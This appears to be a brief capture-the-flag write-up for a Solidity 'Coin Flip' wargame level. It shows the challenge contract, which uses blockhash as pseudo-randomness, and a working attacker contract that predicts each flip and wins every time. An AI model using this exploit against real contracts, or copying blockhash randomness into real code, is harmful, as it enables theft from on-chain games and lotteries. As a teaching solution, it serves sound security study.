# Coin Flip

More help since I'm new to the Remix IDE (Compiling, running and deployment)

```solidity
   contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

We can see the contract uses the *blockhash* to generate pseudo-randomness. We can exploit this by calculating the *blockValue* in Remix IDE, which is the same as running it locally.

With the *blockValue* obtained locally we can just call the *flip* method through an interface with the correct side.

```solidity
  // SPDX-License-Identifier: MIT
  pragma solidity ^0.8.0;

  interface CoinFlip{
    function flip(bool _guess) external returns(bool);
  }

  contract hackedCoinFlip {

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip originalCoinFlip;

    constructor(address _addr){
      originalCoinFlip = CoinFlip(_addr);
    }

    function hackFlip() public {
      uint256 blockValue = uint256(blockhash(block.number-1));
      uint256 coinFlip = blockValue / FACTOR;
      bool side = coinFlip == 1 ? true : false;
      originalCoinFlip.flip(side);
    }
}
```